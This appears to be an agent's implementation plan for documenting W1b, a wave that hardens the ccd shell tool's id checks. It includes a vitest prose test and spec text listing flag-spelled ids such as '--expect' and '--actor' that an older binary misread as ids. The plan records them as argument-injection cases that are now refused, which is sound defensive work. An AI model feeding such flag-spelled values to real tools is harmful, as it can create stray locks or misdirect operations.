L=.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/progress.md
grep -n 'a8\|W1a' "$L" | head                                                        # whether W1a had merged (sets which stop order Task 10 typed)
grep -n 'Task 10' "$L"                                                               # the red-first record; read it whole
grep -oE '`[a-z0-9]+(-[a-z0-9]+){2,}`' "$L" | sort -u                                # every slug the tasks recorded
```

Also record the run id, which the brief names (the brief's `runId`). Step 5 writes it in place of `<n>`. If any of these is missing, STOP and report its label: `_REG_ID_MAX=`, `ID_NAME_TEMPLATES`, `CENSUS_EXCLUDED` (`excluded=NOT FOUND`), §2.8, R98, or Task 10's red-first record. If `W` is not a finite integer, the node line could not read Task 7's table. In that case also STOP, with slug `cap-census-table-unreadable-as-text`.

- [ ] **Step 1: Write the prose test first:** `server/test/path-identity-w1b-prose.test.ts`

```ts
// Path identity W1b: what the spec and the programme's rulings file record about the wave as built (path-identity
// spec §2.9 and §7). The numbers these records state are read from the code here and never restated: the cap from
// `ccd/ccd`, the hook's gates from `ccd/session-hook.sh`, and the name census from `ccd-id-cap.test.ts`'s own tables.
// So a later change to any of them reds this suite until the record is corrected with it. The residuals that hold
// only while the code still shows them are decided from the code too.
import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const read = (f: string): string => readFileSync(path.join(root, f), 'utf8');
/** Flattened: the records wrap their sentences, so a phrase is matched across line breaks. */
const flat = (s: string): string => s.replace(/\s+/g, ' ');
const SPEC = 'docs/superpowers/specs/2026-10-12-path-identity-design.md';
const CONTRACT = 'docs/superpowers/programs/child-reclamation-contract.md';
const CAP_TEST = 'server/test/ccd-id-cap.test.ts';
const HOOK = 'ccd/session-hook.sh';
const DEVIATION_TOKEN = /\bD-\d/;
const FOUR_DIGIT_RANGE = /[0-9]{4} ?(–|\.\.|-) ?[0-9]{4}/;

/** §2.9 alone, from its heading to the next `## ` heading; '' when the heading is missing. */
function asBuilt(): string {
  const s = read(SPEC);
  const at = s.indexOf('\n### 2.9 As built (W1b)\n');
  if (at < 0) return '';
  const end = s.indexOf('\n## ', at + 1);
  return s.slice(at, end < 0 ? s.length : end);
}

/** The integer a shell file assigns to NAME at the start of a line, or NaN when it assigns none. */
function shellInt(file: string, name: string): number {
  const m = new RegExp(`^${name}=(\\d+)\\b`, 'm').exec(read(file));
  return m ? Number(m[1]) : Number.NaN;
}

/** The body of CAP_TEST's top-level `const NAME … = [ … ];`: '' when the array is empty, null when there is none. */
function capTestArray(name: string): string | null {
  const t = read(CAP_TEST);
  const at = t.indexOf(`const ${name}`);
  if (at < 0) return null;
  const open = t.indexOf('= [', at);
  if (open < 0) return null;
  const rest = t.slice(open + 3);
  if (/^\s*\]/.test(rest)) return '';
  const end = rest.search(/\n\s*\][^\n]*;/);
  return end < 0 ? null : rest.slice(0, end);
}

/** Every row's overhead in the census table. An overhead written as a sum of integer literals is summed. */
function censusOverheads(): number[] {
  return [...(capTestArray('ID_NAME_TEMPLATES') ?? '').matchAll(/overhead:\s*([0-9][0-9\s+]*)/g)]
    .map((m) => m[1].split('+').map((x) => Number(x.trim())).reduce((a, b) => a + b, 0));
}

/** The files the census left out, as `CENSUS_EXCLUDED` names them; null when the table cannot be found. */
function censusExcluded(): string[] | null {
  const body = capTestArray('CENSUS_EXCLUDED');
  return body === null ? null : [...body.matchAll(/file:\s*(['"`])([^'"`]+)\1/g)].map((m) => m[2]);
}

/** The departures this wave made, by slug: the plan's expected list. */
const DEPARTURES = ['surface-dash-rule-at-stop-and-ws-add-only', 'dot-rule-extends-to-the-two-audits',
  'reg-id-ok-under-lc-all-c', 'stop-checks-its-residue-and-composed-id', 'ws-add-refuses-a-second-actor',
  'ws-hold-reason-stays-unbounded', 'id-cap-from-the-name-census', 'enable-validates-its-project',
  'collect-registry-peek-before-the-lock', 'section-2-2-verdicts-measured-at-task-10', 'dash-parity-in-its-own-file',
  'collect-verb-prelock-refusal-precedes-the-pause'];

/** The residuals that stand whatever the code says next. */
const BASE_RESIDUALS = ['dot-rule-only-at-the-token-verbs', 'verbs-outside-sec1-keep-the-inline-regex',
  'enable-one-arg-journals-an-unchecked-id', 'hand-planted-ids-over-the-cap', 'files-outside-the-name-census',
  'projects-over-64-get-no-hook-card', 'btime-less-witness-takes-the-lock'];

/** The residuals the records must name at this tip: the fixed list, plus each conditional one while the code still
 *  shows it. These are a server docstring that calls ccd's predicate dot-only, the EXPIRE-V1 note that says it ships
 *  inert, and a cap above the hook's id gate. */
function residualsAtTheTip(): string[] {
  const out = [...BASE_RESIDUALS];
  const dotOnly = /`_ws_tmproot_id_ok`[\s\S]{0,80}?no leading[\s*]*`\.`(?![\s*]*(?:or|and)[\s*]+(?:a[\s*]+)?(?:leading[\s*]+)?`-`)/;
  if (dotOnly.test(read('shared/api.ts')) || dotOnly.test(read('server/src/childReclaimSweep.ts'))) {
    out.push('server-docstrings-call-ccds-predicate-dot-only');
  }
  const ccd = read('ccd/ccd');
  const expireNote = ccd.indexOf('\n# EXPIRE-V1.');
  if (expireNote > -1 && ccd.slice(expireNote, expireNote + 700).includes('ships it inert')) {
    out.push('expire-v1-note-ships-it-inert');
  }
  if (shellInt('ccd/ccd', '_REG_ID_MAX') > shellInt(HOOK, 'CCRC_ID_MAX')) {
    out.push('ids-over-128-invisible-to-the-hook-peer-census');
  }
  return out;
}

describe('the path-identity spec records W1b as built (path-identity spec §2.9, §7)', () => {
  const spec = read(SPEC);
  const s = flat(asBuilt());

  it('§2.9 stands after §2.8 and before §3', () => {
    const p28 = spec.indexOf('\n### 2.8 Proof\n');
    const p29 = spec.indexOf('\n### 2.9 As built (W1b)\n');
    const p3 = spec.indexOf('\n## 3. The temp-root tail and the collector\n');
    expect(p28, '§2.8 is missing').toBeGreaterThan(-1);
    expect(p29, '§2.9 is missing').toBeGreaterThan(p28);
    expect(p3, '§3 must follow §2.9').toBeGreaterThan(p29);
  });

  it('states the cap the code carries, the census it came from and the hook gate it meets', () => {
    const cap = shellInt('ccd/ccd', '_REG_ID_MAX');
    const hookId = shellInt(HOOK, 'CCRC_ID_MAX');
    const hookProj = shellInt(HOOK, 'CCRC_PROJ_MAX');
    const overheads = censusOverheads();
    expect(Number.isInteger(cap), '`_REG_ID_MAX=` not found in ccd/ccd').toBe(true);
    expect(Number.isInteger(hookId) && Number.isInteger(hookProj), "the hook's gates not found").toBe(true);
    expect(overheads.length, 'no overhead read from ID_NAME_TEMPLATES').toBeGreaterThan(0);
    for (const o of overheads) expect(Number.isInteger(o) && o > 0, `overhead ${o}`).toBe(true);
    const w = Math.max(...overheads);
    expect(s).toContain(`The widest overhead is ${w} bytes`);
    expect(s).toContain(`255 minus ${w} is ${255 - w}`);
    expect(s).toContain(`\`_REG_ID_MAX\` is ${cap}`);
    expect(s).toContain(`\`CCRC_ID_MAX\` is ${hookId}`);
    expect(s).toContain(`\`CCRC_PROJ_MAX\` is ${hookProj}`);
    expect(s).toContain("in place of §2.6's 222");
    // A cap above the hook's id gate mints ids the hook's peer census skips: the record must then say so, and only then.
    if (cap > hookId) expect(s).toContain('ids-over-128-invisible-to-the-hook-peer-census');
    else expect(s).not.toContain('ids-over-128-invisible-to-the-hook-peer-census');
  });

  it('names every file the name census left out', () => {
    const files = censusExcluded();
    expect(files, '`CENSUS_EXCLUDED` not found in ccd-id-cap.test.ts').not.toBeNull();
    if (files!.length === 0) expect(s).toContain('The census left no file out.');
    for (const f of files!) expect(s, f).toContain(`\`${f}\``);
  });

  it('states the corrections to §2.4, §2.6 and §2.8, and the precedence the reap lock keeps', () => {
    for (const phrase of [
      'holds everywhere except at stop and ws-add',
      "`stop --surface pwa --surface` is refused by the loop's arity check, not by the post-loop id check",
      'bounded holds for the `--actor` and `--reason` decision fields only',
      '`enable <wrapper> <project>` checks its project with `_ws_project_valid` before it journals anything',
      'a live row of any kind still answers `registered` ahead of `witness-mismatch`',
      'ahead of the cleanup pause',
      '`ccdargv-dash-id-parity.test.ts`',
      'measured by that matrix, run once against the pre-wave binary',
      'one pin per mint site at `_REG_ID_MAX` and at one byte more',
    ]) expect(s, phrase).toContain(phrase);
    expect(s).not.toMatch(DEVIATION_TOKEN);
    expect(s).not.toMatch(FOUR_DIGIT_RANGE);
  });

  it('names every stated residual', () => {
    for (const r of residualsAtTheTip()) expect(s, r).toContain(`\`${r}\``);
  });

  it('marks items 24 to 31 of §7 built, and no other row', () => {
    for (let n = 24; n <= 31; n++) {
      expect(spec, `item ${n}`).toMatch(new RegExp(`^\\| ${n} \\|[^\\n]*\\| Built \\(W1b\\) \\|`, 'm'));
    }
    expect(spec.split('| Built (W1b) |').length - 1).toBe(8);
  });
});

describe('the programme’s rulings file carries the W1b as-built note (path-identity spec §2.9)', () => {
  const c = read(CONTRACT);
  const head = /^### §17 as built \(path-identity W1b, run \d+\)$/m.exec(c);
  const at = head ? head.index : -1;
  const next = at < 0 ? -1 : c.slice(at + 1).search(/\n#{2,3} /);
  const note = at < 0 ? '' : flat(c.slice(at, next < 0 ? c.length : at + 1 + next));

  it('stands in §17, after R98', () => {
    expect(at, 'the as-built note is missing, or its heading names no run number').toBeGreaterThan(-1);
    const r98 = c.indexOf('- **R98 — corrections.**');
    expect(r98, 'R98 is missing').toBeGreaterThan(-1);
    expect(at).toBeGreaterThan(r98);
    const s18 = c.search(/^## 18\. /m);
    if (s18 > -1) expect(at).toBeLessThan(s18);
  });

  it('names every departure and residual by slug, and no number', () => {
    for (const slug of [...DEPARTURES, ...residualsAtTheTip()]) expect(note, slug).toContain(`\`${slug}\``);
    expect(note).not.toMatch(DEVIATION_TOKEN);
    expect(note).not.toMatch(FOUR_DIGIT_RANGE);
  });
});
```

- [ ] **Step 2: Run it and see it fail**

```bash
cd server && ./node_modules/.bin/vitest run test/path-identity-w1b-prose.test.ts
```

Expected: 8 failed out of 8. These red texts are drafted, not measured, so measure them:
- `§2.9 is missing: expected -1 to be greater than <n>`.
- `expected '' to contain 'The widest overhead is 81 bytes'`.
- Either `<file>: expected '' to contain '`<file>`'`, or `expected '' to contain 'The census left no file out.'` when `CENSUS_EXCLUDED` is empty.
- `holds everywhere except at stop and ws-add: expected '' to contain …`.
- `dot-rule-only-at-the-token-verbs: expected '' to contain …`.
- `item 24: expected '…' to match /^\| 24 \|…/m`.
- `the as-built note is missing, or its heading names no run number: expected -1 to be greater than -1`.
- `surface-dash-rule-at-stop-and-ws-add-only: expected '' to contain '`surface-dash-rule-at-stop-and-ws-add-only`'`.

If a case reds on `not found` instead (the cap, the hook gates, `ID_NAME_TEMPLATES` or `CENSUS_EXCLUDED`), Step 0's measurement was wrong: STOP and report it.

- [ ] **Step 3: Write the spec's §2.9.** Insert this block directly above `## 3. The temp-root tail and the collector`, with one blank line on each side.

Follow the spec's voice:
- no contract rule number and no plan ruling number;
- no plan task number;
- no `D-` token;
- straight apostrophes, so the pinned phrases match.

```markdown
### 2.9 As built (W1b)

W1b built ccd's half of this section. This subsection records where what it built narrows, corrects or spells out
§2.2 to §2.8, and names the residuals it leaves. It amends, and rewrites none of the text above. Every claim is
measured at the wave's tip unless it says otherwise.

**One rule for an id a verb binds (SEC1, SEC3).**
- `_reg_id_ok` is the rule: the registry charset, read under `LC_ALL=C`, and no leading `-`. The locale is fixed, so
  a locale whose letter ranges admit a non-ASCII letter cannot widen it.
- The eight `--session` verbs take each identity key and its value as one pair: `--session` at all eight, `--expect`
  at ws-reclaim, ws-expire and ws-collect, `--child-of` at ws-reclaim, ws-hold's positional `--reason`, and
  ws-rename's `--branch`. The pair goes to the loop's residue, never into a variable, so each verb's own arity and
  order checks still refuse a duplicate key, a wrong order and a lone key, with the words they used before. No
  identity arm refuses anything itself, and a value is never scanned again as a flag.
- Every post-loop id check in those eight verbs refuses a leading `-` through `_reg_id_ok`. A call whose id spells a
  flag may now answer `bad session id` where it answered a usage line or a "needs a value" line. A call that spells
  no id as a flag answers as before, byte for byte (measured: every existing suite of these verbs ran green with no
  assertion edited; the one edit, in `ccd-actor-flags.test.ts`, rewords a comment), except where a value itself spells a flag and is now taken whole: a token or run id at the token verbs
  answers `bad token` or `bad run id` where it answered a usage line, a ws-rename `--branch` value answers
  `bad-branch` where the surface word became the new branch name, and a hold reason is held verbatim where the
  surface word was held or a usage line answered.
- `--actor` and `--reason` prose, and a hold reason, may still begin with `-`.
- No refusal word, probe word, journal act or sanctioned `die` sentence was added. The verbs reuse `bad session id`
  and their usage lines. Stop's two new refusals print `bad session id: ` followed by the token or the id they
  refused.

**Corrections to §2.4.**
- §2.4's "`--surface`, `--expect`, and `--branch` retain their existing verb-specific grammars" holds everywhere
  except at stop and ws-add. Those are the two positional-id verbs, and there a `--surface` value that begins with
  `-` is refused, in both the `--surface <v>` and the `--surface=<v>` spellings, because there it closes a redirect.
  The eight `--session` verbs keep their surface grammar, since the `--session` pair already closes their redirect.
- `stop --surface pwa --surface` is refused by the loop's arity check, not by the post-loop id check.
- §2.4's "remains non-blank and bounded": bounded holds for the `--actor` and `--reason` decision fields only.
  ws-hold's positional reason has no byte cap, and W1b adds none.
- Stop also refuses a residue token that begins with `-`, and a composed id that `_reg_id_ok` refuses (one holding a
  `/` or a space, for example), before any unit call or journal row.
- ws-add refuses a second `--actor`, in either spelling or any mix of them, with its usage line. That closes a
  project spelled `--actor` without any change to the server's builder order.

**The predicates (SEC4).**
- `_ws_project_valid` refuses a leading `-` on a line of its own, beside its leading-`.` line. Its four callers that
  print its refusal, `enable`'s new project check among them, say "no LEADING dot or dash". This closes the only mint path for a dash-leading id. Before the
  edit, the wave's entry check counted no dash-leading name in the registry, `pools/`, `tmproots/`,
  `tmpquarantine/`, the project directories or the worktrees, on either box (measured; counts only, listed in the
  pull request).
- `_ws_tmproot_id_ok` is `_reg_id_ok` plus no leading `.`. It is ccd's mirror of `isTmpRootId` without the length
  rule, pinned against it name by name.
- `enable <wrapper> <project>` checks its project with `_ws_project_valid` before it journals anything. It refuses
  more than before: a dot- or dash-leading project leaves no `enable` row. Ahead of it, enable asks its wrapper with
  `cmd_start`'s own check and words, so an unrostered or flag-spelled wrapper leaves no `enable` row and no reap lock
  either.

**Dots (SEC6).**
- ws-reclaim, ws-expire and ws-collect refuse a dot-leading id at entry through `_ws_tmproot_id_ok`. So do
  `ws-audit --reclaim` and `ws-audit --expire`, for symmetry with `isRegistryId`. Plain `ws-audit` keeps the check it
  had.
- ws-release, ws-archive, ws-restore, ws-hold, ws-rename and stop still accept a dot-leading id
  (`dot-rule-only-at-the-token-verbs`). A dot rule there is the operator's option, and was not built.

**The composed-id cap, in place of §2.6's 222 (SEC5).**
- The cap comes from a census of every name derived from an id, in every file under `ccd/` (skill and doc text
  excluded) and in `server/src`. The census covers:
  - registry fields and their temp names;
  - the reap and slot locks;
  - the witness and the quarantine record;
  - the compaction and hook temp names;
  - the `claude-session@<id>.service` unit and its `.d` directory;
  - the history sweep's draining name;
  - the server's per-id files.
- The widest overhead is 81 bytes, for `.<id>.compactcard.<pid>.<nonce>.session-claim.tmp`, so 255 minus 81 is 174.
  §2.6's 222 fit only the slot name.
- The session hook bounds ids too:
  - `CCRC_ID_MAX` is 128. The hook's peer census skips a longer id, and its `.project` reads stop at that length.
  - `CCRC_PROJ_MAX` is 64. A session whose project is longer gets no card, and so does a session with no project
    whose id is longer.
- `_REG_ID_MAX` is 128: the smaller of 174 and the hook's 128, so ccd never mints an id the hook would skip.
- ccd applies the cap at every mint site, before anything is created or journaled. Each site has its own die line,
  ending "nothing was created", and the sentence before it lives once, in `_REG_ID_CAP_WHY`. The sites:
  - ws-add, once the slug is chosen and before `git fetch` and `git worktree add`, for a positional slug and for
    `CCD_WS_SLUG` alike;
  - start's creating form, even when the row already exists;
  - enable's two-argument form, before its journal row.
- `ccd-id-cap.test.ts` holds the census table, the files it left out, and the number. A template added in a scanned
  file without a row reds it.
- The census left out these files, each a stated residual (`files-outside-the-name-census`): `<file>`, because
  `<reason>`.
- §2.8's "One pin per mint site at 222 and 223 characters" reads: one pin per mint site at `_REG_ID_MAX` and at one
  byte more.

**The reap lock is taken after a parse (SEC7).**
- The collect audit and the collect verb open `$REG/.reap-<id>.lock` only after an advisory pass. The pass grants
  nothing and writes nothing. In order:
  1. The id must contain a `-`. If it does not, the answer is unmeasured `registry`, in the same words the locked
     evaluation uses.
  2. Records are listed, and a listing that fails is unmeasured `records`. A record whose body parses and names the id lets the lock open. If records exist but none
     both parses and names the id, the answer is the one the locked resume gives, word and detail byte for byte:
     `quarantine-kept`, or unmeasured `records` or `quarantine`.
  3. With no record, a witness whose body parses lets the lock open.
  4. A witness that does not parse first gets a registry peek, and the lock opens unless all three of these hold:
     `$REG/<id>.child` and `$REG/<id>.uuid` are proven absent; `$REG` can be listed; and the id's slug is free across
     every `$REG/<id>.<field>` and every dot family. When the lock opens, the locked evaluation answers `registered`
     or unmeasured `registry`, as before. Only when all three hold is the witness's answer given before the lock.
- So a live row of any kind still answers `registered` ahead of `witness-mismatch`, with nothing journaled. A junk
  witness or junk record of an id that no row names creates no permanent lock.
- Under the lock every input is listed, read and parsed again before any act. A race between the pass and the lock
  can therefore only refuse, or be judged again.
- The verb reads the cleanup pause under the lock, so its pre-lock answers now come ahead of the cleanup pause. A
  junk witness or record is refused with its own word and a detail saying "no lock was taken", even while the pause
  stands. Nothing moves either way.

**Proof (§2.8, §8).**
- The real-binary proof is a file of its own, `ccdargv-dash-id-parity.test.ts`. It is not `ccdargv-dec-parity`,
  which this wave leaves unedited.
  - It composes every argv through the server's own builders and runs it on `ccd/ccd` under `bash -p`, with fixture
    HOMEs.
  - For stop it adds one typed argv: the order a server before W1a composes.
  - An anti-whitelist keeps every decision-appending verb in it.
- §8's "the verb verdicts of section 2.2" were not measured by the entry check, which writes nothing. They were
  measured by that matrix, run once against the pre-wave binary (a copy outside the tree). These rows went red there,
  and every row is green at the tip.

| Verb | Ids that went red before W1b | What the pre-wave binary did | At the tip |
|---|---|---|---|
| ws-release, ws-archive, ws-restore | `--actor`, `--surface`, `--reason` | Bound the surface word `agent` as the id | Refused before any act |
| ws-reclaim | `--actor`, `--surface`, `--reason`, `--expect` | Bound `agent`; an id of `--expect` created a permanent `.reap---expect.lock` before the token refused | Refused before any lock |
| ws-expire | `--actor`, `--surface`, `--reason`, `--expect`, `--defer-expired` | As ws-reclaim; `--defer-expired` also stayed literal and created a lock | Refused before any lock |
| ws-collect | `--actor`, `--surface`, `--reason` | Bound `agent` | Refused before any lock |
| ws-hold | `--reason` | Bound the literal id `--reason` | Refused before any act |
| ws-rename | `--branch` | Bound the literal id `--branch` | Refused before any act |
| stop, in the order a server before W1a composes | `--surface` | Bound `pwa` as the id | Refused before any unit call |
| ws-add | `--actor`, `--surface` | Bound project `agent`, which is a create | Refused before any worktree |
| Every other verb and id | None | Refused before any lookup, lock or act | Refused, as before |

*Table 1. The decision-carrying verbs, under a decision with and without a reason (ws-add without only).*

| Builder | Values that went red before W1b | At the tip |
|---|---|---|
| `stopPair` | A dash-leading project | Refused before any unit call |
| `start`, `enable` | A dash-leading project | Refused before any row, start or journal line |
| `forget`, `swap`, `swapCross` | None: their arity or usage checks refused them | Refused, as before |
| `wsReclaimAudit`, `wsExpireAudit`, `wsCollectAudit` | None | Refused at entry |
| `wsAudit` | Not a refusal row: it audits the literal id | Kept as before (`verbs-outside-sec1-keep-the-inline-regex`) |

*Table 2. The verbs that take a positional id and carry no decision.*

**Comment carries (§7 items 29 to 31).** Each edit kept its line count. The collector's header now says three things:
- the cleanup pause stops a witness-only collection;
- the audit pays one kill grace, about 73 s, or 78 s at the widest grace, against ws-audit's 90 s row;
- the lane composes `ws-collect`, and acts only once the operator arms it, by the fleet box's legacy marker or by the
  Settings switch where it has shipped.

**Stated residuals.**
- `dot-rule-only-at-the-token-verbs`: release, archive, restore, hold, rename and stop still accept a dot-leading id.
  Refusing it there is an operator option.
- `verbs-outside-sec1-keep-the-inline-regex`: ws-attic, pr-open, plain ws-audit, ws-reap, forget and `start <id>`
  keep the id check they had, and `ensure <id>` and `pr-state --session <id>`, which have no flag loop, bind the id
  they are given literally. Plain ws-audit audits a dash-leading id literally and acts on no other row (pinned).
- `enable-one-arg-journals-an-unchecked-id`: `enable <id>` journals its row before any id check, beside `start <id>`,
  which takes its id unchecked.
- `hand-planted-ids-over-the-cap`: a row planted by hand above `_REG_ID_MAX` is not refused. ccd never mints one.
- `files-outside-the-name-census`: the files the cap's census left out, listed above.
- `projects-over-64-get-no-hook-card`: the cap bounds the composed id, not the project. A project longer than
  `CCRC_PROJ_MAX` still gets no compaction card.
- `btime-less-witness-takes-the-lock`: a witness that parses but records no birth time opens the lock. Its
  `witness-mismatch` stays an answer given under the lock.
- `server-docstrings-call-ccds-predicate-dot-only`: the docstrings of `isTmpRootId` (`shared/api.ts`) and
  `childReclaimLeafKept` (`server/src/childReclaimSweep.ts`) still describe ccd's `_ws_tmproot_id_ok` as refusing a
  leading `.` only. They are carried to the next wave that edits those files.
- `expire-v1-note-ships-it-inert`: the EXPIRE-V1 note in `ccd/ccd` still says the expiry lane ships inert. It is
  workspace lifecycle's text, reported to that programme, and not edited here.
```

Then correct the block to the tip. The code wins over this draft, never the reverse.

- **(a) The cap's numbers.**
  - Put in `81`, `174`, the widest template, `128` and `64` exactly as Step 0 printed them, and quote the widest template exactly as `ID_NAME_TEMPLATES` spells it.
  - If the cap is not the smaller of `255 − W` and `CCRC_ID_MAX` (an operator reversal carried by the brief, to R27 (b) or to 222), rewrite the cap bullet to say what was ruled. Add this bullet to the residuals: "`ids-over-128-invisible-to-the-hook-peer-census`: an id between 129 bytes and the cap can be minted, and the hook's peer census then skips it." The test requires that bullet exactly when the cap exceeds `CCRC_ID_MAX`.
- **(b) The census's left-out files.** Replace the bullet's `` `<file>`, because `<reason>` `` with one clause per `CENSUS_EXCLUDED` row: its file in backticks, then "because" and its reason in plain words. Join them with semicolons. If Step 0 printed `excluded=[]`, replace the whole bullet with the sentence "The census left no file out." and change the residual bullet to read "`files-outside-the-name-census`: none at this tip; the cap's census scanned every file it names."
- **(c) The two tables.**
  - Read the ledger's Task 10 red-first record. Each table row is that record's row, with the verb, the ids and what the pre-wave binary did. The draft rows are the plan's predictions, and the ledger wins.
  - Delete a draft row the ledger does not record as red, and its ids join "Every other verb and id".
  - Add a row for each red the ledger records that the draft lacks, in the draft's wording.
  - If Task 0's `a8` recorded that W1a had NOT merged, stop's row reads "stop, in the order W1a composes", and the Proof bullet's typed argv sentence says "the order W1a composes".
  - A row whose KIND of failure differs from the draft is named in the wave-done by the slug Task 10 already gave it.
- **(d) The conditional residuals.**
  - If Step 0's `EXPIRE-V1` grep printed 0, delete `expire-v1-note-ships-it-inert`.
  - If neither server docstring still says ccd's predicate refuses a leading `.` only, delete `server-docstrings-call-ccds-predicate-dot-only`.
  - The test decides both from the code.
- **(e) Names.** Re-measure every name the block uses:

```bash
grep -n '^_reg_id_ok()\|^_ws_tmproot_id_ok()\|^_REG_ID_CAP_WHY=\|^_ws_collect_prelock()\|^_ws_project_valid()' ccd/ccd
grep -n 'no LEADING dot or dash' ccd/ccd | wc -l                                    # 4: three callers and enable
grep -c '_REG_ID_CAP_WHY — .*nothing was created' ccd/ccd                           # 3: one per mint site (ws-add's older compaction-lock die also says 'nothing was created')
grep -n 'no lock was taken' ccd/ccd | head                                          # the verb's pre-lock detail
grep -n 'export function childReclaimLeafKept\|export function isTmpRootId' server/src/childReclaimSweep.ts shared/api.ts
```

  Correct any sentence the code does not bear out. If a sentence cannot be made true, report it by slug.

- [ ] **Step 4: Mark items 24 to 31 of §7 built**

```bash
sed -i -E '/^\| (2[4-9]|3[01]) \|/s/\| Proposed \|/| Built (W1b) |/' docs/superpowers/specs/2026-10-12-path-identity-design.md
grep -cE '^\| (2[4-9]|3[01]) \|.*\| Built \(W1b\) \|' docs/superpowers/specs/2026-10-12-path-identity-design.md   # 8
grep -c '| Built (W1b) |' docs/superpowers/specs/2026-10-12-path-identity-design.md                               # 8
git diff -U0 -- docs/superpowers/specs/2026-10-12-path-identity-design.md | grep -c '^-| '                          # 8: only those rows changed
```

Each row's What cell stays as it is, item 28's "cap the composed id at 222" included. §2.9 is the correction (R24: W0's decided text is not rewritten).

- [ ] **Step 5: Write the rulings file's note.** Append this block at the end of §17. That is after R98's last bullet, after any `### §17 as built` note already there, and before a `## 18.` heading if one exists. Leave one blank line above it. Replace both `<n>` with the run id the brief names; `grep -c '<n>'` on the file then prints 0.

```markdown
### §17 as built (path-identity W1b, run <n>)

Where W1b's code and its plan's text narrowed, corrected or spelled out the spec's working rulings for ccd's half of
the id fix (SEC1 and SEC3 to SEC7, spec §2.4 to §2.8), they now read as follows. This note amends; it edits no earlier
text. It names each departure by slug and carries no number. The coordinator assigns this wave's numbers from the
block run <n> was issued, and the W1b plan's `## Deviations found` defines them. The spec records the same wave in its
§2.9, and where the two differ, the spec governs, as this section's opening says. This wave's committed comments and
test titles cite the spec, never this contract.

**R93 (the programme's shape).**
- W1b was dispatched after workspace lifecycle wave 6 (#351) merged. Its `ccd/ccd` edits went in series, one task at
  a time, and each was restamped with the repository's own tool. R56's rule for a second lander held at every merge
  of `main`.
- Workspace lifecycle's coordinator consented to its three `ws-expire` edits: the loop's identity pair, the verb's
  entry line and `_ws_expire_audit_contained`'s entry line. `_ws_expire_locked` and the EXPIRE-V1 note were not
  edited.
- The collector header's COLLECT-V1 note now says the lane acts only once the operator arms it, by the fleet box's
  legacy marker or by the Settings switch where it has shipped. That sentence is true whether or not wave 10 has
  merged.

**SEC1 and SEC3 (which verbs; predicates and loops).**
- `surface-dash-rule-at-stop-and-ws-add-only`: a dash-leading `--surface` value is refused at stop and ws-add only,
  the two positional-id verbs, where it closes a redirect. The eight `--session` verbs keep their surface grammar,
  since the `--session` pair closes theirs. `stop --surface pwa --surface` is refused by the loop's arity check, not
  by the post-loop id check. Spec §2.9 corrects §2.4 on both points.
- `reg-id-ok-under-lc-all-c`: `_reg_id_ok`, the one dash rule, reads the registry charset under `LC_ALL=C`, with a pin
  of its own.
- `stop-checks-its-residue-and-composed-id`: stop also refuses a dash-leading residue token, and a composed id that
  `_reg_id_ok` refuses. Each refusal is a bare `die` that names what it refused.
- `ws-add-refuses-a-second-actor`: ws-add refuses a second `--actor`, in either spelling or a mix, with its usage line.
  The server's builder order is unchanged.
- `ws-hold-reason-stays-unbounded`: the spec's "non-blank and bounded" holds for the `--actor` and `--reason` decision
  fields only. The hold reason gets no cap.
- The identity pair stays in each loop's residue, so each verb's own arity and order checks keep refusing a
  duplicate, a wrong order and a lone key with the words they used before. No refusal word, probe word, journal act
  or sanctioned `die` sentence was added.

**SEC4 (the project predicate).**
- `_ws_project_valid` refuses a leading `-`, after the entry check counted no dash-leading name on either box. Its
  four callers, `enable`'s new project check among them, say "no LEADING dot or dash".
- `enable-validates-its-project`: `enable <wrapper> <project>` calls `_ws_project_valid` before it journals, so a dot-
  or dash-leading project leaves no `enable` row. It refuses more than before. It asks its wrapper first, with
  `cmd_start`'s own check and words, so an unrostered or flag-spelled wrapper leaves no `enable` row and no reap lock
  either.

**SEC5 (the cap).**
- `id-cap-from-the-name-census`: the cap is derived from a census of every name derived from an id, not from the slot
  alone. The widest overhead is 81 bytes, so 255 minus 81 is 174. The session hook's peer census skips an id longer
  than `CCRC_ID_MAX`, 128, so `_REG_ID_MAX` is 128, the smaller. It applies at ws-add, at start's creating form and at
  enable's two-argument form, each with its own die line, before anything is created or journaled.
  `ccd-id-cap.test.ts` holds the census and the files it left out.

**SEC6 (dots).**
- `dot-rule-extends-to-the-two-audits`: ws-reclaim, ws-expire and ws-collect refuse a dot-leading id at entry through
  `_ws_tmproot_id_ok`, and so do `ws-audit --reclaim` and `ws-audit --expire`, for symmetry with `isRegistryId`.
  Plain `ws-audit` keeps its check.

**SEC7 (the reap lock).**
- `collect-registry-peek-before-the-lock`:
  - The collect audit and verb open `$REG/.reap-<id>.lock` only after an advisory pass. The pass needs a dash in the
    id, then a record whose body parses and names the id, or, with no record, a witness whose body parses.
  - For a witness that does not parse, a registry peek opens the lock unless `.child` and `.uuid` are proven absent,
    `$REG` can be listed, and the slug is free across every field and dot family. So `registered` still comes ahead
    of `witness-mismatch` for a live row of any kind.
  - R38 stands: no lock is unlinked, and the pass only decides whether one is ever created.
- `collect-verb-prelock-refusal-precedes-the-pause`: the verb reads the cleanup pause under the lock, so a pre-lock
  `witness-mismatch`, `quarantine-kept` or unmeasured answer now comes ahead of `paused`. It is terminal for junk
  either way, and nothing moves.

**The proof (spec §2.8 and §8).**
- `dash-parity-in-its-own-file`: the real-binary proof is `ccdargv-dash-id-parity.test.ts`. `ccdargv-dec-parity.test.ts`
  is unedited.
- `section-2-2-verdicts-measured-at-task-10`: the verdicts in spec §2.2 were measured by that file's matrix, run once
  against the pre-wave binary, not by the entry check, which writes nothing. Spec §2.9 carries the measured tables.

**Stated residuals**, named with no number; spec §2.9 says each one in full.
- `dot-rule-only-at-the-token-verbs`: release, archive, restore, hold, rename and stop still accept a dot-leading id.
- `verbs-outside-sec1-keep-the-inline-regex`: ws-attic, pr-open, plain ws-audit, ws-reap, forget and `start <id>`
  keep the id check they had; `ensure <id>` and `pr-state --session <id>` bind the id they are given literally.
- `enable-one-arg-journals-an-unchecked-id`: `enable <id>` journals before any id check.
- `hand-planted-ids-over-the-cap`: a row planted by hand above `_REG_ID_MAX` is not refused.
- `files-outside-the-name-census`: the files the cap's census left out.
- `projects-over-64-get-no-hook-card`: the cap bounds the composed id, not the project.
- `btime-less-witness-takes-the-lock`: a parsed witness with no birth time opens the lock, and its answer is given
  under it.
